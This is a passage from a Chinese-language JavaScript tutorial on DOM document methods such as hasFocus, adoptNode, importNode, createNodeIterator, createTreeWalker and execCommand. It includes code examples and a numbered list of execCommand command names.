<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加事件监听函数</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除事件监听函数</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发事件</span></span><br><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">dispatchEvent</span>(event);</span><br></pre></td></tr></table></figure>



<h4 id="3-16-document-hasFocus-判断当前文档是否有元素被激活或获取焦点"><a href="#3-16-document-hasFocus-判断当前文档是否有元素被激活或获取焦点" class="headerlink" title="3.16 document.hasFocus() 判断当前文档是否有元素被激活或获取焦点"></a>3.16 document.hasFocus() 判断当前文档是否有元素被激活或获取焦点</h4><p><code>document.hasFocus</code>方法<strong>返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> focused = <span class="variable language_">document</span>.<span class="title function_">hasFocus</span>();</span><br></pre></td></tr></table></figure>

<p><strong>注意，有焦点的文档必定被激活（active），反之不成立，激活的文档未必有焦点。比如，用户点击按钮，从当前窗口跳出一个新窗口，该新窗口就是激活的，但是不拥有焦点。</strong></p>
<h4 id="3-17-document-adoptNode-采用外部节点，document-importNode-输入（拷贝）外部节点"><a href="#3-17-document-adoptNode-采用外部节点，document-importNode-输入（拷贝）外部节点" class="headerlink" title="3.17 document.adoptNode() 采用外部节点，document.importNode() 输入（拷贝）外部节点"></a>3.17 document.adoptNode() 采用外部节点，document.importNode() 输入（拷贝）外部节点</h4><p><code>document.adoptNode</code>方法<strong>将某个节点及其子节点，从原来所在的文档或<code>DocumentFragment</code>里面移除，归属当前<code>document</code>对象，返回插入后的新节点</strong>。插入的节点对象的<code>ownerDocument</code>属性，会变成当前的<code>document</code>对象，而<code>parentNode</code>属性是<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> node = <span class="variable language_">document</span>.<span class="title function_">adoptNode</span>(externalNode); <span class="comment">// externalNode 外部节点</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">appendChild</span>(node);</span><br></pre></td></tr></table></figure>

<p>注意，<code>document.adoptNode</code>方法只是<strong>改变了节点的归属</strong>，并没有将这个节点插入新的文档树。所以，还要再用<code>appendChild</code>方法或<code>insertBefore</code>方法，将新节点插入当前文档树。</p>
<p><code>document.importNode</code>方法则是<strong>从原来所在的文档或<code>DocumentFragment</code>里面，拷贝某个节点及其子节点，让它们归属当前<code>document</code>对象</strong>。拷贝的节点对象的<code>ownerDocument</code>属性，会变成当前的<code>document</code>对象，而<code>parentNode</code>属性是<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> node = <span class="variable language_">document</span>.<span class="title function_">importNode</span>(externalNode, deep); <span class="comment">// externalNode 外部节点 deep是否深拷贝</span></span><br></pre></td></tr></table></figure>

<p><code>document.importNode</code>方法的<strong>第一个参数是外部节点</strong>，<strong>第二个参数是一个布尔值，表示对外部节点是深拷贝还是浅拷贝</strong>，默认是浅拷贝（false）。虽然第二个参数是可选的，但是建议总是保留这个参数，并设为<code>true</code>。</p>
<p>注意，<code>document.importNode</code>方法只是拷贝外部节点，这时该节点的父节点是<code>null</code>。下一步还必须将这个节点插入当前文档树。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;iframe&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> oldNode = iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myNode&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> newNode = <span class="variable language_">document</span>.<span class="title function_">importNode</span>(oldNode, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;container&quot;</span>).<span class="title function_">appendChild</span>(newNode);</span><br></pre></td></tr></table></figure>

<p><strong>上面代码从<code>iframe</code>窗口，拷贝一个指定节点<code>myNode</code>，插入当前文档。</strong></p>
<h4 id="3-18-document-createNodeIterator-返回一个子节点遍历器（NodeFilter实例）"><a href="#3-18-document-createNodeIterator-返回一个子节点遍历器（NodeFilter实例）" class="headerlink" title="3.18 document.createNodeIterator() 返回一个子节点遍历器（NodeFilter实例）"></a>3.18 document.createNodeIterator() 返回一个子节点遍历器（NodeFilter实例）</h4><p><code>document.createNodeIterator</code>方法<strong>返回一个子节点遍历器（NodeFilter实例）</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nodeIterator = <span class="variable language_">document</span>.<span class="title function_">createNodeIterator</span>(</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>, <span class="comment">// 所要遍历的根节点</span></span><br><span class="line">  <span class="title class_">NodeFilter</span>.<span class="property">SHOW_ELEMENT</span> <span class="comment">// 所要遍历的节点类型</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面代码返回<code>&lt;body&gt;</code>元素子节点的遍历器。</p>
<p><code>document.createNodeIterator</code>方法<strong>第一个参数为所要遍历的根节点</strong>，<strong>第二个参数为所要遍历的节点类型</strong>，这里指定为元素节点（<code>NodeFilter.SHOW_ELEMENT</code>）。几种主要的节点类型写法如下。</p>
<ul>
<li><strong>所有节点：NodeFilter.SHOW_ALL</strong></li>
<li><strong>元素节点：NodeFilter.SHOW_ELEMENT</strong></li>
<li><strong>文本节点：NodeFilter.SHOW_TEXT</strong></li>
<li><strong>评论节点：NodeFilter.SHOW_COMMENT</strong></li>
</ul>
<p><code>document.createNodeIterator</code>方法返回一个“遍历器”对象（<code>NodeFilter</code>实例）。该实例的<code>nextNode()</code>方法和<code>previousNode()</code>方法，可以用来遍历所有子节点。</p>
<p><strong>每次调用NodeFilter实例的nextNode() &#x2F; previousNode()方法都会把当前指针往 下一个 &#x2F; 上一个节点移动。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nodeIterator = <span class="variable language_">document</span>.<span class="title function_">createNodeIterator</span>(<span class="variable language_">document</span>.<span class="property">body</span>);</span><br><span class="line"><span class="keyword">var</span> pars = [];</span><br><span class="line"><span class="keyword">var</span> currentNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (currentNode = nodeIterator.<span class="title function_">nextNode</span>()) &#123; </span><br><span class="line">    <span class="comment">// js中所有运算符都有返回值，为运算结果。这里面即给currentNode赋值了，还会自动调用Boolean()进行布尔运算。</span></span><br><span class="line">    <span class="comment">// 每次调用NodeFilter实例的nextNode()方法都会返回下一个节点</span></span><br><span class="line">    </span><br><span class="line">  pars.<span class="title function_">push</span>(currentNode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，使用遍历器的<code>nextNode</code>方法，将根节点的所有子节点，依次读入一个数组。<code>nextNode</code>方法先返回遍历器的内部指针所在的节点，然后会将指针移向下一个节点。所有成员遍历完成后，返回<code>null</code>。<code>previousNode</code>方法则是先将指针移向上一个节点，然后返回该节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> nodeIterator = <span class="variable language_">document</span>.<span class="title function_">createNodeIterator</span>(</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>,</span><br><span class="line">  <span class="title class_">NodeFilter</span>.<span class="property">SHOW_ELEMENT</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> currentNode = nodeIterator.<span class="title function_">nextNode</span>();</span><br><span class="line"><span class="keyword">var</span> previousNode = nodeIterator.<span class="title function_">previousNode</span>();</span><br><span class="line"></span><br><span class="line">currentNode === previousNode <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>currentNode</code>和<code>previousNode</code>都指向同一个的节点。</p>
<p>注意，遍历器返回的<strong>第一个节点，总是根节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pars[<span class="number">0</span>] === <span class="variable language_">document</span>.<span class="property">body</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h4 id="3-19-document-createTreeWalker-返回一个DOM的子树遍历器（TreeWalker实例）"><a href="#3-19-document-createTreeWalker-返回一个DOM的子树遍历器（TreeWalker实例）" class="headerlink" title="3.19 document.createTreeWalker() 返回一个DOM的子树遍历器（TreeWalker实例）"></a>3.19 document.createTreeWalker() 返回一个DOM的子树遍历器（TreeWalker实例）</h4><p><code>document.createTreeWalker</code>方法<strong>返回一个 DOM 的子树遍历器</strong>。它与<code>document.createNodeIterator</code>方法基本是类似的，区别在于它返回的是<code>TreeWalker</code>实例，后者返回的是<code>NodeIterator</code>实例。另外，它的<strong>第一个节点不是根节点</strong>。</p>
<p><code>document.createTreeWalker</code>方法的<strong>第一个参数是所要遍历的根节点</strong>，<strong>第二个参数指定所要遍历的节点类型</strong>（与<code>document.createNodeIterator</code>方法的第二个参数相同）。</p>
<p><strong>和<code>document.createNodeIterator</code>方法区别二是：<code>TreeWalker</code>实例有<code>currentNode</code>属性。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> treeWalker = <span class="variable language_">document</span>.<span class="title function_">createTreeWalker</span>(</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>, <span class="comment">// 所要遍历的根节点</span></span><br><span class="line">  <span class="title class_">NodeFilter</span>.<span class="property">SHOW_ELEMENT</span> <span class="comment">// 所要遍历的节点类型</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nodeList = [];</span><br><span class="line"><span class="comment">// 每调用一次nextNode()，currentNode属性的值将改为下一个节点</span></span><br><span class="line"><span class="keyword">while</span>(treeWalker.<span class="title function_">nextNode</span>()) &#123;</span><br><span class="line">  nodeList.<span class="title function_">push</span>(treeWalker.<span class="property">currentNode</span>); <span class="comment">// TreeWalker实例有currentNode属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码遍历<code>&lt;body&gt;</code>节点下属的所有元素节点，将它们插入<code>nodeList</code>数组。</p>
<h4 id="3-20-document-execCommand-，document-queryCommandSupported-，document-queryCommandEnabled"><a href="#3-20-document-execCommand-，document-queryCommandSupported-，document-queryCommandEnabled" class="headerlink" title="3.20 document.execCommand()，document.queryCommandSupported()，document.queryCommandEnabled()"></a>3.20 document.execCommand()，document.queryCommandSupported()，document.queryCommandEnabled()</h4><h5 id="（1）document-execCommand-执行命令（实现复制文本等功能，富文本编辑器大量使用此方法）"><a href="#（1）document-execCommand-执行命令（实现复制文本等功能，富文本编辑器大量使用此方法）" class="headerlink" title="（1）document.execCommand() 执行命令（实现复制文本等功能，富文本编辑器大量使用此方法）"></a>（1）document.execCommand() 执行命令（实现复制文本等功能，富文本编辑器大量使用此方法）</h5><p>概念一： <strong>当一个HTML文档切换到设计模式时，<code>document</code>暴露 <code>execCommand</code> 方法，该方法允许运行命令来操纵<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/contenteditable">可编辑内容区域</a>的元素。</strong> </p>
<p>概念二： <strong>execCommand方法是执行一个对当前文档，当前选择或者给出范围的命令。处理Html数据时常用</strong> </p>
<p>概念三：如果<code>document.designMode</code>属性设为<code>on</code>，那么整个文档用户可编辑；如果元素的<code>contenteditable</code>属性设为<code>true</code>，那么该元素可编辑。这两种情况下，可以使用<code>document.execCommand()</code>方法，改变内容的样式，比如<code>document.execCommand(&#39;bold&#39;)</code>会使得字体加粗。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">execCommand</span>(command, showDefaultUI, input)</span><br></pre></td></tr></table></figure>

<p>该方法接受三个参数。</p>
<ul>
<li><code>command</code>：字符串，表示所要实施的样式。</li>
<li><code>showDefaultUI</code>：布尔值，表示是否要使用默认的用户界面，建议总是设为<code>false</code>。</li>
<li><code>input</code>：字符串，表示该样式的辅助内容，比如生成超级链接时，这个参数就是所要链接的网址。如果第二个参数设为<code>true</code>，那么浏览器会弹出提示框，要求用户在提示框输入该参数。但是，不是所有浏览器都支持这样做，为了兼容性，还是需要自己部署获取这个参数的方式。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;请输入网址&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (url) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;createlink&#x27;</span>, <span class="literal">false</span>, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，先提示用户输入所要链接的网址，然后手动生成超级链接。注意，第二个参数是<code>false</code>，表示此时不需要自动弹出提示框。</p>
<p><code>document.execCommand()</code>的返回值是一个布尔值。如果为<code>false</code>，表示这个方法无法生效。</p>
<p>这个方法大部分情况下，只对选中的内容生效。如果有多个内容可编辑区域，那么只对当前焦点所在的元素生效。</p>
<p><code>document.execCommand()</code>方法可以执行的样式改变有很多种，下面是其中的一些：bold、insertLineBreak、selectAll、createLink、insertOrderedList、subscript、delete、insertUnorderedList、superscript、formatBlock、insertParagraph、undo、forwardDelete、insertText、unlink、insertImage、italic、unselect、insertHTML、redo。这些值都可以用作第一个参数，它们的含义不难从字面上看出来。</p>
<h6 id="命令列表"><a href="#命令列表" class="headerlink" title="命令列表"></a>命令列表</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="number">2</span>D-<span class="attribute">Position</span> 允许通过拖曳移动绝对定位的对象。  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. AbsolutePosition 设定元素的 <span class="attribute">position</span> 属性为“absolute”(绝对)。  </span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. BackColor 设置或获取当前选中区的背景颜色。  </span><br><span class="line"></span><br><span class="line"><span class="number">4</span>. BlockDirLTR 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">5</span>. BlockDirRTL 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">6</span>. Bold 切换当前选中区的粗体显示与否。  </span><br><span class="line"></span><br><span class="line"><span class="number">7</span>. BrowseMode 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">8</span>. Copy 将当前选中区复制到剪贴板。  </span><br><span class="line"></span><br><span class="line"><span class="number">9</span>. CreateBookmark 创建一个书签锚或获取当前选中区或插入点的书签锚的名称。  </span><br><span class="line"></span><br><span class="line"><span class="number">10</span><span class="selector-class">.CreateLink</span> 在当前选中区上插入超级链接，或显示一个对话框允许用户指定要为当前选中区插入的超级链接的 URL。  </span><br><span class="line"></span><br><span class="line"><span class="number">11</span><span class="selector-class">.Cut</span> 将当前选中区复制到剪贴板并删除之。  </span><br><span class="line"></span><br><span class="line"><span class="number">12</span><span class="selector-class">.Delete</span> 删除当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">13</span><span class="selector-class">.DirLTR</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">14</span><span class="selector-class">.DirRTL</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">15</span><span class="selector-class">.EditMode</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">16</span><span class="selector-class">.FontName</span> 设置或获取当前选中区的字体。  </span><br><span class="line"></span><br><span class="line"><span class="number">17</span><span class="selector-class">.FontSize</span> 设置或获取当前选中区的字体大小。  </span><br><span class="line"></span><br><span class="line"><span class="number">18</span><span class="selector-class">.ForeColor</span> 设置或获取当前选中区的前景(文本)颜色。  </span><br><span class="line"></span><br><span class="line"><span class="number">19</span><span class="selector-class">.FormatBlock</span> 设置当前块格式化标签。  </span><br><span class="line"></span><br><span class="line"><span class="number">20</span><span class="selector-class">.Indent</span> 增加选中文本的缩进。  </span><br><span class="line"></span><br><span class="line"><span class="number">21</span><span class="selector-class">.InlineDirLTR</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">22</span><span class="selector-class">.InlineDirRTL</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">23</span><span class="selector-class">.InsertButton</span> 用按钮控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">24</span><span class="selector-class">.InsertFieldset</span> 用方框覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">25</span><span class="selector-class">.InsertHorizontalRule</span> 用水平线覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">26</span><span class="selector-class">.InsertIFrame</span> 用内嵌框架覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">27</span><span class="selector-class">.InsertImage</span> 用图像覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">28</span><span class="selector-class">.InsertInputButton</span> 用按钮控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">29</span><span class="selector-class">.InsertInputCheckbox</span> 用复选框控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">30</span><span class="selector-class">.InsertInputFileUpload</span> 用文件上载控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">31</span><span class="selector-class">.InsertInputHidden</span> 插入隐藏控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">32</span><span class="selector-class">.InsertInputImage</span> 用图像控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">33</span><span class="selector-class">.InsertInputPassword</span> 用密码控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">34</span><span class="selector-class">.InsertInputRadio</span> 用单选钮控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">35</span><span class="selector-class">.InsertInputReset</span> 用重置控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">36</span><span class="selector-class">.InsertInputSubmit</span> 用提交控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">37</span><span class="selector-class">.InsertInputText</span> 用文本控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">38</span><span class="selector-class">.InsertMarquee</span> 用空字幕覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">39</span><span class="selector-class">.InsertOrderedList</span> 切换当前选中区是编号列表还是常规格式化块。  </span><br><span class="line"></span><br><span class="line"><span class="number">40</span><span class="selector-class">.InsertParagraph</span> 用换行覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">41</span><span class="selector-class">.InsertSelectDropdown</span> 用下拉框控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">42</span><span class="selector-class">.InsertSelectListbox</span> 用列表框控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">43</span><span class="selector-class">.InsertTextArea</span> 用多行文本输入控件覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">44</span><span class="selector-class">.InsertUnorderedList</span> 切换当前选中区是项目符号列表还是常规格式化块。  </span><br><span class="line"></span><br><span class="line"><span class="number">45</span><span class="selector-class">.Italic</span> 切换当前选中区斜体显示与否。  </span><br><span class="line"></span><br><span class="line"><span class="number">46</span><span class="selector-class">.JustifyCenter</span> 将当前选中区在所在格式化块置中。  </span><br><span class="line"></span><br><span class="line"><span class="number">47</span><span class="selector-class">.JustifyFull</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">48</span><span class="selector-class">.JustifyLeft</span> 将当前选中区所在格式化块左对齐。  </span><br><span class="line"></span><br><span class="line"><span class="number">49</span><span class="selector-class">.JustifyNone</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">50</span><span class="selector-class">.JustifyRight</span> 将当前选中区所在格式化块右对齐。  </span><br><span class="line"></span><br><span class="line"><span class="number">51</span><span class="selector-class">.LiveResize</span> 迫使 MSHTML 编辑器在缩放或移动过程中持续更新元素外观，而不是只在移动或缩放完成后更新。  </span><br><span class="line"></span><br><span class="line"><span class="number">52</span><span class="selector-class">.MultipleSelection</span> 允许当用户按住 Shift 或 Ctrl 键时一次选中多于一个站点可选元素。  </span><br><span class="line"></span><br><span class="line"><span class="number">53</span><span class="selector-class">.Open</span> 打开。  </span><br><span class="line"></span><br><span class="line"><span class="number">54</span><span class="selector-class">.Outdent</span> 减少选中区所在格式化块的缩进。  </span><br><span class="line"></span><br><span class="line"><span class="number">55</span><span class="selector-class">.OverWrite</span> 切换文本状态的插入和覆盖。  </span><br><span class="line"></span><br><span class="line"><span class="number">56</span><span class="selector-class">.Paste</span> 用剪贴板内容覆盖当前选中区。  </span><br><span class="line"></span><br><span class="line"><span class="number">57</span><span class="selector-class">.PlayImage</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">58</span><span class="selector-class">.Print</span> 打开打印对话框以便用户可以打印当前页。  </span><br><span class="line"></span><br><span class="line"><span class="number">59</span><span class="selector-class">.Redo</span> 重做。  </span><br><span class="line"></span><br><span class="line"><span class="number">60</span><span class="selector-class">.Refresh</span> 刷新当前文档。  </span><br><span class="line"></span><br><span class="line"><span class="number">61</span><span class="selector-class">.RemoveFormat</span> 从当前选中区中删除格式化标签。  </span><br><span class="line"></span><br><span class="line"><span class="number">62</span><span class="selector-class">.RemoveParaFormat</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">63</span><span class="selector-class">.SaveAs</span> 将当前 Web 页面保存为文件。  </span><br><span class="line"></span><br><span class="line"><span class="number">64</span><span class="selector-class">.SelectAll</span> 选中整个文档。  </span><br><span class="line"></span><br><span class="line"><span class="number">65</span><span class="selector-class">.SizeToControl</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">66</span><span class="selector-class">.SizeToControlHeight</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">67</span><span class="selector-class">.SizeToControlWidth</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">68</span><span class="selector-class">.Stop</span> 停止。  </span><br><span class="line"></span><br><span class="line"><span class="number">69</span><span class="selector-class">.StopImage</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">70</span><span class="selector-class">.StrikeThrough</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">71</span><span class="selector-class">.Subscript</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">72</span><span class="selector-class">.Superscript</span> 目前尚未支持。  </span><br><span class="line"></span><br><span class="line"><span class="number">73</span><span class="selector-class">.UnBookmark</span> 从当前选中区中删除全部书签。  </span><br><span class="line"></span><br><span class="line"><span class="number">74</span><span class="selector-class">.Underline</span> 切换当前选中区的下划线显示与否。  </span><br><span class="line"></span><br><span class="line"><span class="number">75</span><span class="selector-class">.Undo</span> 撤消。  </span><br><span class="line"></span><br><span class="line"><span class="number">76</span><span class="selector-class">.Unlink</span> 从当前选中区中删除全部超级链接。  </span><br><span class="line"></span><br><span class="line"><span class="number">77</span><span class="selector-class">.Unselect</span> 清除当前选中区的选中状态。   </span><br></pre></td></tr></table></figure>







<h5 id="（2）document-queryCommandSupported-浏览器是否支持execCommand的某个命令"><a href="#（2）document-queryCommandSupported-浏览器是否支持execCommand的某个命令" class="headerlink" title="（2）document.queryCommandSupported() 浏览器是否支持execCommand的某个命令"></a>（2）document.queryCommandSupported() 浏览器是否支持execCommand的某个命令</h5><p><code>document.queryCommandSupported()</code>方法返回一个布尔值，表示浏览器是否支持<code>document.execCommand()</code>的某个命令。</p>
